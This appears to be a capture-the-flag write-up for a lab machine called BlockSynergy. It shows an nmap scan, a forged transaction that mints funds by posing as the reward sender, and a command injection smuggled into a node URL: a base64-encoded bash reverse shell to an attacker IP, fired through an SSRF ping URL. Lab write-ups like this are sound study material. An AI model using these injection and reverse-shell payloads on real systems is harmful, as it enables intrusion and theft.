# BlockSynergy 

<img width="1592" height="279" alt="image" src="https://github.com/user-attachments/assets/b0380ad0-6a15-4b9c-ba9d-d2fb58d56dfd" />

---

## Nmap Scan

```ruby
─$ nmap -sCV -Pn 10.129.66.1      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 00:32 UTC
Nmap scan report for blocksynergy.htb (10.129.66.1)
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0b:93:57:66:c8:a4:f0:85:6a:d2:e1:a4:d5:f4:52:81 (ECDSA)
|_  256 aa:38:b7:38:85:1d:21:1e:db:0a:15:8b:c8:a4:03:92 (ED25519)
8080/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: BlockSynergy \xE2\x80\x93 Decentralized Future
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds

```

---

<img width="1918" height="840" alt="image" src="https://github.com/user-attachments/assets/8fb3ea49-ef39-479a-beb5-4c55211aea0b" />

## Create a Wallet and load it 

```
curl -X POST http://blocksynergy.htb:8080/dashboard/wallet \
  -F "action=create" \
  -F "filename=mywallet" \
  -v
```

<img width="1563" height="259" alt="image" src="https://github.com/user-attachments/assets/ee11689f-60f5-40fd-aad2-d9d20c039bef" />

## found endpoints 

<img width="1873" height="680" alt="image" src="https://github.com/user-attachments/assets/37d3a41b-8903-475a-9acb-800801667025" />

## in **`blockchain`** we found sender call **`Blockchain_Reward`** with it's signiture

<img width="1556" height="230" alt="image" src="https://github.com/user-attachments/assets/b2e80b29-f016-4264-ac6b-9887a4243cc2" />

## let's try to transfer money with it 

```
 curl -X POST http://blocksynergy.htb:8080/broadcast_transaction \
  -H "Content-Type: application/json" \
  -d '{
    "amount": 1000000,
    "receiver": "7aebb26b14abe9c112617deb9db64a0cf5715ff510f3982e3a78d067f88e4b9dc84304dec98344815e81b349d209169bcf492b11e8ea4a01f91352abe8c21dd6",
    "sender": "Blockchain_Reward",
    "signature": "Blockchain",
    "timestamp": "2026-09-02 00:40:00"
  }'
```

<img width="1432" height="569" alt="image" src="https://github.com/user-attachments/assets/a7265d56-0a6e-470f-b16a-6d4e24035f38" />

## there is another intresting endpoint call **`/dashboard/vip/nodes`**

<img width="1919" height="523" alt="image" src="https://github.com/user-attachments/assets/29915e43-37ba-4fc2-a7b4-076fff978762" />

## Registering the Malicious Node (Command Injection)

```
curl -X POST http://blocksynergy.htb:8080/dashboard/vip/nodes \
  -H "Cookie: session=YOUR_SESSION" \
  -d "action=register" \
  -d "node=http://x;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw==|base64 -d|bash;a@0.0.0.0:8080/"
```

**The Payload Breakdown:**

```text

http://x;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw==|base64 -d|bash;a@0.0.0.0:8080/
```

|Part|Purpose|
|---|---|
|`http://x`|Invalid hostname (doesn't resolve)|
|`;`|Command separator: terminates the URL parsing|
|`echo BASE64`|Decodes and executes the reverse shell|
|`\|base64 -d\|bash`|Decodes base64 and executes the command|
|`;a@0.0.0.0:8080/`|Makes it look like a valid URL|

**The Base64 Payload:**

```text

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw==
```

Decoded:

```bash

bash -c 'bash -i >& /dev/tcp/10.10.17.163/4444 0>&1'
```

**What happened when registering:**

1. The server stored the node URL in its database
    
2. No validation was done on the content (vulnerability)
    
3. The semicolon was allowed in the URL (vulnerability)

---

## The SSRF Trigger 

```
http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=http%3A%2F%2F10.129.66.1%3Becho%20YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNTU1NSAwPiYxJw%3D%3D%7Cbase64%20-d%7Cbash%3Ba%4010.129.66.1%3A8080%2F
```

---

## Triggering the Exploit

<img width="997" height="490" alt="image" src="https://github.com/user-attachments/assets/8d523627-16c3-49d7-805f-8e463383d8a7" />

---

## Boom got shell 

<img width="992" height="208" alt="image" src="https://github.com/user-attachments/assets/2e09da3b-9c12-489d-a439-dbed395d8c33" />

